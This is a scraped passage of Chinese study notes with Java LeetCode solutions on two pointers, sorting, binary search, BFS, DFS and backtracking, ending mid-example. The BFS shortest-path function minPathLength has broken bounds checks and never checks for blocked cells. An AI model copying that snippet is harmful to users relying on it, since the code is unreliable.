633. Sum of Square Numbers (Easy) 123Input: 5Output: TrueExplanation: 1 * 1 + 2 * 2 = 5 题目描述：判断一个数是否为两个数的平方和，例如 5 = 12 + 22。 1234567891011121314public boolean judgeSquareSum(int c) &#123; int i = 0, j = (int) Math.sqrt(c); while (i &lt;= j) &#123; int powSum = i * i + j * j; if (powSum == c) &#123; return true; &#125; else if (powSum &gt; c) &#123; j--; &#125; else &#123; i++; &#125; &#125; return false;&#125; 反转字符串中的元音字符 345. Reverse Vowels of a String (Easy) 1Given s = "leetcode", return "leotcede". 使用双指针，指向待反转的两个元音字符，一个指针从头向尾遍历，一个指针从尾到头遍历。 12345678910111213141516171819private final static HashSet&lt;Character&gt; vowels = new HashSet&lt;&gt;(Arrays.asList('a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U'));public String reverseVowels(String s) &#123; int i = 0, j = s.length() - 1; char[] result = new char[s.length()]; while (i &lt;= j) &#123; char ci = s.charAt(i); char cj = s.charAt(j); if (!vowels.contains(ci)) &#123; result[i++] = ci; &#125; else if (!vowels.contains(cj)) &#123; result[j--] = cj; &#125; else &#123; result[i++] = cj; result[j--] = ci; &#125; &#125; return new String(result);&#125; 回文字符串 680. Valid Palindrome II (Easy) 123Input: "abca"Output: TrueExplanation: You could delete the character 'c'. 题目描述：可以删除一个字符，判断是否能构成回文字符串。 123456789101112131415161718public boolean validPalindrome(String s) &#123; int i = -1, j = s.length(); while (++i &lt; --j) &#123; if (s.charAt(i) != s.charAt(j)) &#123; return isPalindrome(s, i, j - 1) || isPalindrome(s, i + 1, j); &#125; &#125; return true;&#125;private boolean isPalindrome(String s, int i, int j) &#123; while (i &lt; j) &#123; if (s.charAt(i++) != s.charAt(j--)) &#123; return false; &#125; &#125; return true;&#125; 归并两个有序数组 88. Merge Sorted Array (Easy) 12345Input:nums1 = [1,2,3,0,0,0], m = 3nums2 = [2,5,6], n = 3Output: [1,2,2,3,5,6] 题目描述：把归并结果存到第一个数组上。 需要从尾开始遍历，否则在 nums1 上归并得到的值会覆盖还未进行归并比较的值 123456789101112131415public void merge(int[] nums1, int m, int[] nums2, int n) &#123; int index1 = m - 1, index2 = n - 1; int indexMerge = m + n - 1; while (index1 &gt;= 0 || index2 &gt;= 0) &#123; if (index1 &lt; 0) &#123; nums1[indexMerge--] = nums2[index2--]; &#125; else if (index2 &lt; 0) &#123; nums1[indexMerge--] = nums1[index1--]; &#125; else if (nums1[index1] &gt; nums2[index2]) &#123; nums1[indexMerge--] = nums1[index1--]; &#125; else &#123; nums1[indexMerge--] = nums2[index2--]; &#125; &#125;&#125; 判断链表是否存在环 141. Linked List Cycle (Easy) 使用双指针，一个指针每次移动一个节点，一个指针每次移动两个节点，如果存在环，那么这两个指针一定会相遇。 1234567891011121314public boolean hasCycle(ListNode head) &#123; if (head == null) &#123; return false; &#125; ListNode l1 = head, l2 = head.next; while (l1 != null &amp;&amp; l2 != null &amp;&amp; l2.next != null) &#123; if (l1 == l2) &#123; return true; &#125; l1 = l1.next; l2 = l2.next.next; &#125; return false;&#125; 最长子序列 524. Longest Word in Dictionary through Deleting (Medium) 12345Input:s = &quot;abpcplea&quot;, d = [&quot;ale&quot;,&quot;apple&quot;,&quot;monkey&quot;,&quot;plea&quot;]Output:&quot;apple&quot; 题目描述：删除 s 中的一些字符，使得它构成字符串列表 d 中的一个字符串，找出能构成的最长字符串。如果有多个相同长度的结果，返回按字典序排序的最大字符串。 123456789101112131415161718192021222324public String findLongestWord(String s, List&lt;String&gt; d) &#123; String longestWord = ""; for (String target : d) &#123; int l1 = longestWord.length(), l2 = target.length(); if (l1 &gt; l2 || (l1 == l2 &amp;&amp; longestWord.compareTo(target) &lt; 0)) &#123; continue; &#125; if (isValid(s, target)) &#123; longestWord = target; &#125; &#125; return longestWord;&#125;private boolean isValid(String s, String target) &#123; int i = 0, j = 0; while (i &lt; s.length() &amp;&amp; j &lt; target.length()) &#123; if (s.charAt(i) == target.charAt(j)) &#123; j++; &#125; i++; &#125; return j == target.length();&#125; 排序快速选择一般用于求解 Kth Element 问题，可以在 O(N) 时间复杂度，O(1) 空间复杂度完成求解工作。 与快速排序一样，快速选择一般需要先打乱数组，否则最坏情况下时间复杂度为 O(N2)。 堆排序堆排序用于求解 TopK Elements 问题，通过维护一个大小为 K 的堆，堆中的元素就是 TopK Elements。当然它也可以用于求解 Kth Element 问题，堆顶元素就是 Kth Element。快速选择也可以求解 TopK Elements 问题，因为找到 Kth Element 之后，再遍历一次数组，所有小于等于 Kth Element 的元素都是 TopK Elements。可以看到，快速选择和堆排序都可以求解 Kth Element 和 TopK Elements 问题。 Kth Element 215. Kth Largest Element in an Array (Medium) 排序 ：时间复杂度 O(NlogN)，空间复杂度 O(1) 1234public int findKthLargest(int[] nums, int k) &#123; Arrays.sort(nums); return nums[nums.length - k];&#125; 堆排序 ：时间复杂度 O(NlogK)，空间复杂度 O(K)。 123456789public int findKthLargest(int[] nums, int k) &#123; PriorityQueue&lt;Integer&gt; pq = new PriorityQueue&lt;&gt;(); // 小顶堆 for (int val : nums) &#123; pq.add(val); if (pq.size() &gt; k) // 维护堆的大小为 K pq.poll(); &#125; return pq.peek();&#125; 快速选择 ：时间复杂度 O(N)，空间复杂度 O(1) 1234567891011121314151617181920212223242526272829303132333435public int findKthLargest(int[] nums, int k) &#123; k = nums.length - k; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int j = partition(nums, l, h); if (j == k) &#123; break; &#125; else if (j &lt; k) &#123; l = j + 1; &#125; else &#123; h = j - 1; &#125; &#125; return nums[k];&#125;private int partition(int[] a, int l, int h) &#123; int i = l, j = h + 1; while (true) &#123; while (a[++i] &lt; a[l] &amp;&amp; i &lt; h) ; while (a[--j] &gt; a[l] &amp;&amp; j &gt; l) ; if (i &gt;= j) &#123; break; &#125; swap(a, i, j); &#125; swap(a, l, j); return j;&#125;private void swap(int[] a, int i, int j) &#123; int t = a[i]; a[i] = a[j]; a[j] = t;&#125; 桶排序出现频率最多的 k 个数 347. Top K Frequent Elements (Medium) 1Given [1,1,1,2,2,3] and k = 2, return [1,2]. 设置若干个桶，每个桶存储出现频率相同的数，并且桶的下标代表桶中数出现的频率，即第 i 个桶中存储的数出现的频率为 i。把数都放到桶之后，从后向前遍历桶，最先得到的 k 个数就是出现频率最多的的 k 个数。 123456789101112131415161718192021public List&lt;Integer&gt; topKFrequent(int[] nums, int k) &#123; Map&lt;Integer, Integer&gt; frequencyForNum = new HashMap&lt;&gt;(); for (int num : nums) &#123; frequencyForNum.put(num, frequencyForNum.getOrDefault(num, 0) + 1); &#125; List&lt;Integer&gt;[] buckets = new ArrayList[nums.length + 1]; for (int key : frequencyForNum.keySet()) &#123; int frequency = frequencyForNum.get(key); if (buckets[frequency] == null) &#123; buckets[frequency] = new ArrayList&lt;&gt;(); &#125; buckets[frequency].add(key); &#125; List&lt;Integer&gt; topK = new ArrayList&lt;&gt;(); for (int i = buckets.length - 1; i &gt;= 0 &amp;&amp; topK.size() &lt; k; i--) &#123; if (buckets[i] != null) &#123; topK.addAll(buckets[i]); &#125; &#125; return topK;&#125; 按照字符出现次数对字符串排序 451. Sort Characters By Frequency (Medium) 123456789Input:"tree"Output:"eert"Explanation:'e' appears twice while 'r' and 't' both appear once.So 'e' must appear before both 'r' and 't'. Therefore "eetr" is also a valid answer. 1234567891011121314151617181920212223242526public String frequencySort(String s) &#123; Map&lt;Character, Integer&gt; frequencyForNum = new HashMap&lt;&gt;(); for (char c : s.toCharArray()) frequencyForNum.put(c, frequencyForNum.getOrDefault(c, 0) + 1); List&lt;Character&gt;[] frequencyBucket = new ArrayList[s.length() + 1]; for (char c : frequencyForNum.keySet()) &#123; int f = frequencyForNum.get(c); if (frequencyBucket[f] == null) &#123; frequencyBucket[f] = new ArrayList&lt;&gt;(); &#125; frequencyBucket[f].add(c); &#125; StringBuilder str = new StringBuilder(); for (int i = frequencyBucket.length - 1; i &gt;= 0; i--) &#123; if (frequencyBucket[i] == null) &#123; continue; &#125; for (char c : frequencyBucket[i]) &#123; for (int j = 0; j &lt; i; j++) &#123; str.append(c); &#125; &#125; &#125; return str.toString();&#125; 荷兰国旗问题荷兰国旗包含三种颜色：红、白、蓝。有这三种颜色的球，算法的目标是将这三种球按颜色顺序正确地排列。 它其实是三向切分快速排序的一种变种，在三向切分快速排序中，每次切分都将数组分成三个区间：小于切分元素、等于切分元素、大于切分元素，而该算法是将数组分成三个区间：等于红色、等于白色、等于蓝色。 按颜色进行排序 75. Sort Colors (Medium) 12Input: [2,0,2,1,1,0]Output: [0,0,1,1,2,2] 题目描述：只有 0/1/2 三种颜色。 123456789101112131415161718public void sortColors(int[] nums) &#123; int zero = -1, one = 0, two = nums.length; while (one &lt; two) &#123; if (nums[one] == 0) &#123; swap(nums, ++zero, one++); &#125; else if (nums[one] == 2) &#123; swap(nums, --two, one); &#125; else &#123; ++one; &#125; &#125;&#125;private void swap(int[] nums, int i, int j) &#123; int t = nums[i]; nums[i] = nums[j]; nums[j] = t;&#125; 二分查找正常实现 1234567891011121314public int binarySearch(int[] nums, int key) &#123; int l = 0, h = nums.length - 1; while (l &lt;= h) &#123; int m = l + (h - l) / 2; if (nums[m] == key) &#123; return m; &#125; else if (nums[m] &gt; key) &#123; h = m - 1; &#125; else &#123; l = m + 1; &#125; &#125; return -1;&#125; 时间复杂度 二分查找也称为折半查找，每次都能将查找区间减半，这种折半特性的算法时间复杂度都为 O(logN)。 m 计算 有两种计算中值 m 的方式： m = (l + h) / 2 m = l + (h - l) / 2 l + h 可能出现加法溢出，最好使用第二种方式。 返回值 循环退出时如果仍然没有查找到 key，那么表示查找失败。可以有两种返回值： -1：以一个错误码表示没有查找到 key l：将 key 插入到 nums 中的正确位置 变种 二分查找可以有很多变种，变种实现要注意边界值的判断。例如在一个有重复元素的数组中查找 key 的最左位置的实现如下： 123456789101112public int binarySearch(int[] nums, int key) &#123; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int m = l + (h - l) / 2; if (nums[m] &gt;= key) &#123; h = m; &#125; else &#123; l = m + 1; &#125; &#125; return l;&#125; 该实现和正常实现有以下不同： 循环条件为 l &lt; h h 的赋值表达式为 h = m 最后返回 l 而不是 -1 在 nums[m] &gt;= key 的情况下，可以推导出最左 key 位于 [l, m] 区间中，这是一个闭区间。h 的赋值表达式为 h = m，因为 m 位置也可能是解。 在 h 的赋值表达式为 h = mid 的情况下，如果循环条件为 l &lt;= h，那么会出现循环无法退出的情况，因此循环条件只能是 l &lt; h。以下演示了循环条件为 l &lt;= h 时循环无法退出的情况： 1234567nums = &#123;0, 1, 2&#125;, key = 1l m h0 1 2 nums[m] &gt;= key0 0 1 nums[m] &lt; key1 1 1 nums[m] &gt;= key1 1 1 nums[m] &gt;= key... 当循环体退出时，不表示没有查找到 key，因此最后返回的结果不应该为 -1。为了验证有没有查找到，需要在调用端判断一下返回位置上的值和 key 是否相等。 求开方 69. Sqrt(x) (Easy) 123456Input: 4Output: 2Input: 8Output: 2Explanation: The square root of 8 is 2.82842..., and since we want to return an integer, the decimal part will be truncated. 一个数 x 的开方 sqrt 一定在 0 \ x 之间，并且满足 sqrt == x / sqrt。可以利用二分查找在 0 \ x 之间查找 sqrt。 对于 x = 8，它的开方是 2.82842…，最后应该返回 2 而不是 3。在循环条件为 l &lt;= h 并且循环退出时，h 总是比 l 小 1，也就是说 h = 2，l = 3，因此最后的返回值应该为 h 而不是 l。 123456789101112131415161718public int mySqrt(int x) &#123; if (x &lt;= 1) &#123; return x; &#125; int l = 1, h = x; while (l &lt;= h) &#123; int mid = l + (h - l) / 2; int sqrt = x / mid; if (sqrt == mid) &#123; return mid; &#125; else if (mid &gt; sqrt) &#123; h = mid - 1; &#125; else &#123; l = mid + 1; &#125; &#125; return h;&#125; 大于给定元素的最小元素 744. Find Smallest Letter Greater Than Target (Easy) 123456789Input:letters = ["c", "f", "j"]target = "d"Output: "f"Input:letters = ["c", "f", "j"]target = "k"Output: "c" 题目描述：给定一个有序的字符数组 letters 和一个字符 target，要求找出 letters 中大于 target 的最小字符，如果找不到就返回第 1 个字符。 12345678910111213public char nextGreatestLetter(char[] letters, char target) &#123; int n = letters.length; int l = 0, h = n - 1; while (l &lt;= h) &#123; int m = l + (h - l) / 2; if (letters[m] &lt;= target) &#123; l = m + 1; &#125; else &#123; h = m - 1; &#125; &#125; return l &lt; n ? letters[l] : letters[0];&#125; 有序数组的 Single Element 540. Single Element in a Sorted Array (Medium) 12Input: [1,1,2,3,3,4,4,8,8]Output: 2 题目描述：一个有序数组只有一个数不出现两次，找出这个数。要求以 O(logN) 时间复杂度进行求解。 令 index 为 Single Element 在数组中的位置。如果 m 为偶数，并且 m + 1 &lt; index，那么 nums[m] == nums[m + 1]；m + 1 &gt;= index，那么 nums[m] != nums[m + 1]。 从上面的规律可以知道，如果 nums[m] == nums[m + 1]，那么 index 所在的数组位置为 [m + 2, h]，此时令 l = m + 2；如果 nums[m] != nums[m + 1]，那么 index 所在的数组位置为 [l, m]，此时令 h = m。 因为 h 的赋值表达式为 h = m，那么循环条件也就只能使用 l &lt; h 这种形式。 123456789101112131415public int singleNonDuplicate(int[] nums) &#123; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int m = l + (h - l) / 2; if (m % 2 == 1) &#123; m--; // 保证 l/h/m 都在偶数位，使得查找区间大小一直都是奇数 &#125; if (nums[m] == nums[m + 1]) &#123; l = m + 2; &#125; else &#123; h = m; &#125; &#125; return nums[l];&#125; 第一个错误的版本 278. First Bad Version (Easy) 题目描述：给定一个元素 n 代表有 [1, 2, …, n] 版本，可以调用 isBadVersion(int x) 知道某个版本是否错误，要求找到第一个错误的版本。 如果第 m 个版本出错，则表示第一个错误的版本在 [l, m] 之间，令 h = m；否则第一个错误的版本在 [m + 1, h] 之间，令 l = m + 1。 因为 h 的赋值表达式为 h = m，因此循环条件为 l &lt; h。 123456789101112public int firstBadVersion(int n) &#123; int l = 1, h = n; while (l &lt; h) &#123; int mid = l + (h - l) / 2; if (isBadVersion(mid)) &#123; h = mid; &#125; else &#123; l = mid + 1; &#125; &#125; return l;&#125; 旋转数组的最小数字 153. Find Minimum in Rotated Sorted Array (Medium) 12Input: [3,4,5,1,2],Output: 1 123456789101112public int findMin(int[] nums) &#123; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int m = l + (h - l) / 2; if (nums[m] &lt;= nums[h]) &#123; h = m; &#125; else &#123; l = m + 1; &#125; &#125; return nums[l];&#125; 查找区间 34. Search for a Range (Medium) 12345Input: nums = [5,7,7,8,8,10], target = 8Output: [3,4]Input: nums = [5,7,7,8,8,10], target = 6Output: [-1,-1] 12345678910111213141516171819202122public int[] searchRange(int[] nums, int target) &#123; int first = binarySearch(nums, target); int last = binarySearch(nums, target + 1) - 1; if (first == nums.length || nums[first] != target) &#123; return new int[]&#123;-1, -1&#125;; &#125; else &#123; return new int[]&#123;first, Math.max(first, last)&#125;; &#125;&#125;private int binarySearch(int[] nums, int target) &#123; int l = 0, h = nums.length; // 注意 h 的初始值 while (l &lt; h) &#123; int m = l + (h - l) / 2; if (nums[m] &gt;= target) &#123; h = m; &#125; else &#123; l = m + 1; &#125; &#125; return l;&#125; 搜索深度优先搜索和广度优先搜索广泛运用于树和图中，但是它们的应用远远不止如此。 BFS 广度优先搜索的搜索过程有点像一层一层地进行遍历，每层遍历都以上一层遍历的结果作为起点，遍历一个距离能访问到的所有节点。需要注意的是，遍历过的节点不能再次被遍历。 第一层： 0 -&gt; {6,2,1,5}; 第二层： 6 -&gt; {4} 2 -&gt; {} 1 -&gt; {} 5 -&gt; {3} 第三层： 4 -&gt; {} 3 -&gt; {} 可以看到，每一层遍历的节点都与根节点距离相同。设 di 表示第 i 个节点与根节点的距离，推导出一个结论：对于先遍历的节点 i 与后遍历的节点 j，有 di&lt;=dj。利用这个结论，可以求解最短路径等 最优解 问题：第一次遍历到目的节点，其所经过的路径为最短路径。应该注意的是，使用 BFS 只能求解无权图的最短路径。 在程序实现 BFS 时需要考虑以下问题： 队列：用来存储每一轮遍历得到的节点； 标记：对于遍历过的节点，应该将它标记，防止重复遍历。 计算在网格中从原点到特定点的最短路径长度 1234[[1,1,0,1], [1,0,1,0], [1,1,1,1], [1,0,1,1]] 1 表示可以经过某个位置，求解从 (0, 0) 位置到 (tr, tc) 位置的最短路径长度。 1234567891011121314151617181920212223242526272829public int minPathLength(int[][] grids, int tr, int tc) &#123; final int[][] direction = &#123;&#123;1, 0&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;0, -1&#125;&#125;; final int m = grids.length, n = grids[0].length; Queue&lt;Pair&lt;Integer, Integer&gt;&gt; queue = new LinkedList&lt;&gt;(); queue.add(new Pair&lt;&gt;(0, 0)); int pathLength = 0; while (!queue.isEmpty()) &#123; int size = queue.size(); pathLength++; while (size-- &gt; 0) &#123; Pair&lt;Integer, Integer&gt; cur = queue.poll(); for (int[] d : direction) &#123; int nr = cur.getKey() + d[0], nc = cur.getValue() + d[1]; Pair&lt;Integer, Integer&gt; next = new Pair&lt;&gt;(nr, nc); if (next.getKey() &lt; 0 || next.getValue() &gt;= m || next.getKey() &lt; 0 || next.getValue() &gt;= n) &#123; continue; &#125; grids[next.getKey()][next.getValue()] = 0; // 标记 if (next.getKey() == tr &amp;&amp; next.getValue() == tc) &#123; return pathLength; &#125; queue.add(next); &#125; &#125; &#125; return -1;&#125; 组成整数的最小平方数数量 279. Perfect Squares (Medium) 1For example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9. 可以将每个整数看成图中的一个节点，如果两个整数之差为一个平方数，那么这两个整数所在的节点就有一条边。 要求解最小的平方数数量，就是求解从节点 n 到节点 0 的最短路径。 本题也可以用动态规划求解，在之后动态规划部分中会再次出现。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546public int numSquares(int n) &#123; List&lt;Integer&gt; squares = generateSquares(n); Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;(); boolean[] marked = new boolean[n + 1]; queue.add(n); marked[n] = true; int level = 0; while (!queue.isEmpty()) &#123; int size = queue.size(); level++; while (size-- &gt; 0) &#123; int cur = queue.poll(); for (int s : squares) &#123; int next = cur - s; if (next &lt; 0) &#123; break; &#125; if (next == 0) &#123; return level; &#125; if (marked[next]) &#123; continue; &#125; marked[next] = true; queue.add(cur - s); &#125; &#125; &#125; return n;&#125;/** * 生成小于 n 的平方数序列 * @return 1,4,9,... */private List&lt;Integer&gt; generateSquares(int n) &#123; List&lt;Integer&gt; squares = new ArrayList&lt;&gt;(); int square = 1; int diff = 3; while (square &lt;= n) &#123; squares.add(square); square += diff; diff += 2; &#125; return squares;&#125; 最短单词路径 127. Word Ladder (Medium) 123456789Input:beginWord = "hit",endWord = "cog",wordList = ["hot","dot","dog","lot","log","cog"]Output: 5Explanation: As one shortest transformation is "hit" -&gt; "hot" -&gt; "dot" -&gt; "dog" -&gt; "cog",return its length 5. 12345678Input:beginWord = "hit"endWord = "cog"wordList = ["hot","dot","dog","lot","log"]Output: 0Explanation: The endWord "cog" is not in wordList, therefore no possible transformation. 找出一条从 beginWord 到 endWord 的最短路径，每次移动规定为改变一个字符，并且改变之后的字符串必须在 wordList 中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public int ladderLength(String beginWord, String endWord, List&lt;String&gt; wordList) &#123; wordList.add(beginWord); int N = wordList.size(); int start = N - 1; int end = 0; while (end &lt; N &amp;&amp; !wordList.get(end).equals(endWord)) &#123; end++; &#125; if (end == N) &#123; return 0; &#125; List&lt;Integer&gt;[] graphic = buildGraphic(wordList); return getShortestPath(graphic, start, end);&#125;private List&lt;Integer&gt;[] buildGraphic(List&lt;String&gt; wordList) &#123; int N = wordList.size(); List&lt;Integer&gt;[] graphic = new List[N]; for (int i = 0; i &lt; N; i++) &#123; graphic[i] = new ArrayList&lt;&gt;(); for (int j = 0; j &lt; N; j++) &#123; if (isConnect(wordList.get(i), wordList.get(j))) &#123; graphic[i].add(j); &#125; &#125; &#125; return graphic;&#125;private boolean isConnect(String s1, String s2) &#123; int diffCnt = 0; for (int i = 0; i &lt; s1.length() &amp;&amp; diffCnt &lt;= 1; i++) &#123; if (s1.charAt(i) != s2.charAt(i)) &#123; diffCnt++; &#125; &#125; return diffCnt == 1;&#125;private int getShortestPath(List&lt;Integer&gt;[] graphic, int start, int end) &#123; Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;(); boolean[] marked = new boolean[graphic.length]; queue.add(start); marked[start] = true; int path = 1; while (!queue.isEmpty()) &#123; int size = queue.size(); path++; while (size-- &gt; 0) &#123; int cur = queue.poll(); for (int next : graphic[cur]) &#123; if (next == end) &#123; return path; &#125; if (marked[next]) &#123; continue; &#125; marked[next] = true; queue.add(next); &#125; &#125; &#125; return 0;&#125; DFS 广度优先搜索一层一层遍历，每一层得到的所有新节点，要用队列存储起来以备下一层遍历的时候再遍历。 而深度优先搜索在得到一个新节点时立马对新节点进行遍历：从节点 0 出发开始遍历，得到到新节点 6 时，立马对新节点 6 进行遍历，得到新节点 4；如此反复以这种方式遍历新节点，直到没有新节点了，此时返回。返回到根节点 0 的情况是，继续对根节点 0 进行遍历，得到新节点 2，然后继续以上步骤。 从一个节点出发，使用 DFS 对一个图进行遍历时，能够遍历到的节点都是从初始节点可达的，DFS 常用来求解这种 可达性 问题。 在程序实现 DFS 时需要考虑以下问题： 栈：用栈来保存当前节点信息，当遍历新节点返回时能够继续遍历当前节点。可以使用递归栈。 标记：和 BFS 一样同样需要对已经遍历过的节点进行标记。 查找最大的连通面积 695. Max Area of Island (Easy) 12345678[[0,0,1,0,0,0,0,1,0,0,0,0,0], [0,0,0,0,0,0,0,1,1,1,0,0,0], [0,1,1,0,1,0,0,0,0,0,0,0,0], [0,1,0,0,1,1,0,0,1,0,1,0,0], [0,1,0,0,1,1,0,0,1,1,1,0,0], [0,0,0,0,0,0,0,0,0,0,1,0,0], [0,0,0,0,0,0,0,1,1,1,0,0,0], [0,0,0,0,0,0,0,1,1,0,0,0,0]] 1234567891011121314151617181920212223242526272829private int m, n;private int[][] direction = &#123;&#123;0, 1&#125;, &#123;0, -1&#125;, &#123;1, 0&#125;, &#123;-1, 0&#125;&#125;;public int maxAreaOfIsland(int[][] grid) &#123; if (grid == null || grid.length == 0) &#123; return 0; &#125; m = grid.length; n = grid[0].length; int maxArea = 0; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; maxArea = Math.max(maxArea, dfs(grid, i, j)); &#125; &#125; return maxArea;&#125;private int dfs(int[][] grid, int r, int c) &#123; if (r &lt; 0 || r &gt;= m || c &lt; 0 || c &gt;= n || grid[r][c] == 0) &#123; return 0; &#125; grid[r][c] = 0; int area = 1; for (int[] d : direction) &#123; area += dfs(grid, r + d[0], c + d[1]); &#125; return area;&#125; 矩阵中的连通分量数目 200. Number of Islands (Medium) 1234567Input:11000110000010000011Output: 3 可以将矩阵表示看成一张有向图。 123456789101112131415161718192021222324252627282930private int m, n;private int[][] direction = &#123;&#123;0, 1&#125;, &#123;0, -1&#125;, &#123;1, 0&#125;, &#123;-1, 0&#125;&#125;;public int numIslands(char[][] grid) &#123; if (grid == null || grid.length == 0) &#123; return 0; &#125; m = grid.length; n = grid[0].length; int islandsNum = 0; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (grid[i][j] != '0') &#123; dfs(grid, i, j); islandsNum++; &#125; &#125; &#125; return islandsNum;&#125;private void dfs(char[][] grid, int i, int j) &#123; if (i &lt; 0 || i &gt;= m || j &lt; 0 || j &gt;= n || grid[i][j] == '0') &#123; return; &#125; grid[i][j] = '0'; for (int[] d : direction) &#123; dfs(grid, i + d[0], j + d[1]); &#125;&#125; 好友关系的连通分量数目 547. Friend Circles (Medium) 1234567Input:[[1,1,0], [1,1,0], [0,0,1]]Output: 2Explanation:The 0th and 1st students are direct friends, so they are in a friend circle.The 2nd student himself is in a friend circle. So return 2. 好友关系可以看成是一个无向图，例如第 0 个人与第 1 个人是好友，那么 M[0][1] 和 M[1][0] 的值都为 1。 1234567891011121314151617181920212223private int n;public int findCircleNum(int[][] M) &#123; n = M.length; int circleNum = 0; boolean[] hasVisited = new boolean[n]; for (int i = 0; i &lt; n; i++) &#123; if (!hasVisited[i]) &#123; dfs(M, i, hasVisited); circleNum++; &#125; &#125; return circleNum;&#125;private void dfs(int[][] M, int i, boolean[] hasVisited) &#123; hasVisited[i] = true; for (int k = 0; k &lt; n; k++) &#123; if (M[i][k] == 1 &amp;&amp; !hasVisited[k]) &#123; dfs(M, k, hasVisited); &#125; &#125;&#125; 填充封闭区域 130. Surrounded Regions (Medium) 1234567891011For example,X X X XX O O XX X O XX O X XAfter running your function, the board should be:X X X XX X X XX X X XX O X X 使被 ‘X’ 包围的 ‘O’ 转换为 ‘X’。 先填充最外侧，剩下的就是里侧了。 12345678910111213141516171819202122232425262728293031323334353637383940private int[][] direction = &#123;&#123;0, 1&#125;, &#123;0, -1&#125;, &#123;1, 0&#125;, &#123;-1, 0&#125;&#125;;private int m, n;public void solve(char[][] board) &#123; if (board == null || board.length == 0) &#123; return; &#125; m = board.length; n = board[0].length; for (int i = 0; i &lt; m; i++) &#123; dfs(board, i, 0); dfs(board, i, n - 1); &#125; for (int i = 0; i &lt; n; i++) &#123; dfs(board, 0, i); dfs(board, m - 1, i); &#125; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (board[i][j] == 'T') &#123; board[i][j] = 'O'; &#125; else if (board[i][j] == 'O') &#123; board[i][j] = 'X'; &#125; &#125; &#125;&#125;private void dfs(char[][] board, int r, int c) &#123; if (r &lt; 0 || r &gt;= m || c &lt; 0 || c &gt;= n || board[r][c] != 'O') &#123; return; &#125; board[r][c] = 'T'; for (int[] d : direction) &#123; dfs(board, r + d[0], c + d[1]); &#125;&#125; 能到达的太平洋和大西洋的区域 417. Pacific Atlantic Water Flow (Medium) 123456789101112Given the following 5x5 matrix: Pacific &lt;sub&gt; &lt;/sub&gt; &lt;sub&gt; &lt;/sub&gt; ~ ~ 1 2 2 3 (5) * ~ 3 2 3 (4) (4) * ~ 2 4 (5) 3 1 * ~ (6) (7) 1 4 5 * ~ (5) 1 1 2 4 * * * * * * AtlanticReturn:[[0, 4], [1, 3], [1, 4], [2, 2], [3, 0], [3, 1], [4, 0]] (positions with parentheses in above matrix). 左边和上边是太平洋，右边和下边是大西洋，内部的数字代表海拔，海拔高的地方的水能够流到低的地方，求解水能够流到太平洋和大西洋的所有位置。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253private int m, n;private int[][] matrix;private int[][] direction = &#123;&#123;0, 1&#125;, &#123;0, -1&#125;, &#123;1, 0&#125;, &#123;-1, 0&#125;&#125;;public List&lt;int[]&gt; pacificAtlantic(int[][] matrix) &#123; List&lt;int[]&gt; ret = new ArrayList&lt;&gt;(); if (matrix == null || matrix.length == 0) &#123; return ret; &#125; m = matrix.length; n = matrix[0].length; this.matrix = matrix; boolean[][] canReachP = new boolean[m][n]; boolean[][] canReachA = new boolean[m][n]; for (int i = 0; i &lt; m; i++) &#123; dfs(i, 0, canReachP); dfs(i, n - 1, canReachA); &#125; for (int i = 0; i &lt; n; i++) &#123; dfs(0, i, canReachP); dfs(m - 1, i, canReachA); &#125; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (canReachP[i][j] &amp;&amp; canReachA[i][j]) &#123; ret.add(new int[]&#123;i, j&#125;); &#125; &#125; &#125; return ret;&#125;private void dfs(int r, int c, boolean[][] canReach) &#123; if (canReach[r][c]) &#123; return; &#125; canReach[r][c] = true; for (int[] d : direction) &#123; int nextR = d[0] + r; int nextC = d[1] + c; if (nextR &lt; 0 || nextR &gt;= m || nextC &lt; 0 || nextC &gt;= n || matrix[r][c] &gt; matrix[nextR][nextC]) &#123; continue; &#125; dfs(nextR, nextC, canReach); &#125;&#125; BacktrackingBacktracking（回溯）属于 DFS。 普通 DFS 主要用在 可达性问题 ，这种问题只需要执行到特点的位置然后返回即可。 而 Backtracking 主要用于求解 排列组合 问题，例如有 { ‘a’,’b’,’c’ } 三个字符，求解所有由这三个字符排列得到的字符串，这种问题在执行到特定的位置返回之后还会继续执行求解过程。 因为 Backtracking 不是立即就返回，而要继续求解，因此在程序实现时，需要注意对元素的标记问题： 在访问一个新元素进入新的递归调用时，需要将新元素标记为已经访问，这样才能在继续递归调用时不用重复访问该元素； 但是在递归返回时，需要将元素标记为未访问，因为只需要保证在一个递归链中不同时访问一个元素，可以访问已经访问过但是不在当前递归链中的元素。 数字键盘组合 17. Letter Combinations of a Phone Number (Medium) 12Input:Digit string "23"Output: ["ad", "ae", "af", "bd", "be", "bf", "cd", "ce", "cf"]. 12345678910111213141516171819202122232425private static final String[] KEYS = &#123;"", "", "abc", "def", "ghi", "jkl", "mno", "pqrs", "tuv", "wxyz"&#125;;public List&lt;String&gt; letterCombinations(String digits) &#123; List&lt;String&gt; combinations = new ArrayList&lt;&gt;(); if (digits == null || digits.length() == 0) &#123; return combinations; &#125; doCombination(new StringBuilder(), combinations, digits); return combinations;&#125;private void doCombination(StringBuilder prefix, List&lt;String&gt; combinations, final String digits) &#123; if (prefix.length() == digits.length()) &#123; combinations.add(prefix.toString()); return; &#125; int curDigits = digits.charAt(prefix.length()) - '0'; String letters = KEYS[curDigits]; for (char c : letters.toCharArray()) &#123; prefix.append(c); // 添加 doCombination(prefix, combinations, digits); prefix.deleteCharAt(prefix.length() - 1); // 删除 &#125;&#125; IP 地址划分 93. Restore IP Addresses(Medium) 12Given "25525511135",return ["255.255.11.135", 